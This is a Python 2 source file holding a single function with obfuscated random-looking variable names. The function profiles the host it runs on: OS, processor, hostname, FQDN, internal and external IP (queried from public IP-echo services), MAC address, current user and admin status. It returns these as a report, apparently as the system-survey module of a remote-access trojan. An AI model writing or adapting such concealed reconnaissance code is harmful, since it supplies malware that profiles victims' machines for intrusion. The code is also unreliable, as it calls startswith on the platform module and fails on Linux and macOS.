# -*- coding: utf-8 -*-
import ctypes
import getpass
import os
import platform
import socket
import urllib
import uuid
def lbBccHiiDmGapnfkBzGcriIbWppvyzNz(plat_type):
    eqLkAkBjgGjTGfPeDauGnluuVklQLyTG = platform.platform()
    processor    = platform.processor()
    architecture = platform.architecture()[0]
    kNtjcTmaUphPWqJHGfwMFJsJusUMFIyx = getpass.getuser()
    ijxYzpttYCmNkIjDvYYHDZIxZwCgoSlz    = socket.gethostname()
    FJJDnEjHDRLBxULFQMdiYnOHEobcGAeW        = socket.getfqdn()
    XewTXXutMzoStpggiNmfNjOkaWqFtuYC = socket.gethostbyname(ijxYzpttYCmNkIjDvYYHDZIxZwCgoSlz)
    vNbIFEIuqevaxwWVArcrgIquJDHzADrF     = uuid.getnode()
    MjtIPFNnVjOLUbDguyKOlWxZKjiqSYKB         = ':'.join(("%012X" % vNbIFEIuqevaxwWVArcrgIquJDHzADrF)[tknkraSeKCplXonScDzEvCvHGHSEDAAX:tknkraSeKCplXonScDzEvCvHGHSEDAAX+2] for tknkraSeKCplXonScDzEvCvHGHSEDAAX in range(0, 12, 2))
    YhRPaWdzrgmCkPoTWVAZKhRkWmfVfndt = [ 'ipinfo.io/ip', 'icanhazip.com', 'ident.me',
                   'ipecho.net/plain', 'myexternalip.com/raw' ]
    bWzMjYSPVDqxOvwJgHbKuXULOTsKnYXe = ''
    for kZOAqfHfsupfmFHaHZnLDQEHpblqSUCA in YhRPaWdzrgmCkPoTWVAZKhRkWmfVfndt:
        try:
            bWzMjYSPVDqxOvwJgHbKuXULOTsKnYXe = urllib.urlopen('http://'+kZOAqfHfsupfmFHaHZnLDQEHpblqSUCA).read().rstrip()
        except IOError:
            pass
        if bWzMjYSPVDqxOvwJgHbKuXULOTsKnYXe and (6 < len(bWzMjYSPVDqxOvwJgHbKuXULOTsKnYXe) < 16):
            break
    OiKcunAkxiNMgLHAbDPggXmrlUYgGOSn = False
    if plat_type.startswith('win'):
        OiKcunAkxiNMgLHAbDPggXmrlUYgGOSn = ctypes.windll.shell32.IsUserAnAdmin() != 0
    elif plat_type.startswith('linux') or platform.startswith('darwin'):
        OiKcunAkxiNMgLHAbDPggXmrlUYgGOSn = os.getuid() == 0
    cfjOMtHyAXIidgjFpwpHeIJKlFsdEBcP = 'Yes' if OiKcunAkxiNMgLHAbDPggXmrlUYgGOSn else 'No'
    aeHabJpBgsEkaDKTTSDEgByVgAaKnAtJ = '''
    System Platform     - {}
    Processor           - {}
    Architecture        - {}
    Hostname            - {}
    FQDN                - {}
    Internal IP         - {}
    External IP         - {}
    MAC Address         - {}
    Current User        - {}
    Admin Access        - {}
    '''.format(eqLkAkBjgGjTGfPeDauGnluuVklQLyTG, processor, architecture,
    ijxYzpttYCmNkIjDvYYHDZIxZwCgoSlz, FJJDnEjHDRLBxULFQMdiYnOHEobcGAeW, XewTXXutMzoStpggiNmfNjOkaWqFtuYC, bWzMjYSPVDqxOvwJgHbKuXULOTsKnYXe, MjtIPFNnVjOLUbDguyKOlWxZKjiqSYKB, kNtjcTmaUphPWqJHGfwMFJsJusUMFIyx, cfjOMtHyAXIidgjFpwpHeIJKlFsdEBcP)
    return aeHabJpBgsEkaDKTTSDEgByVgAaKnAtJ
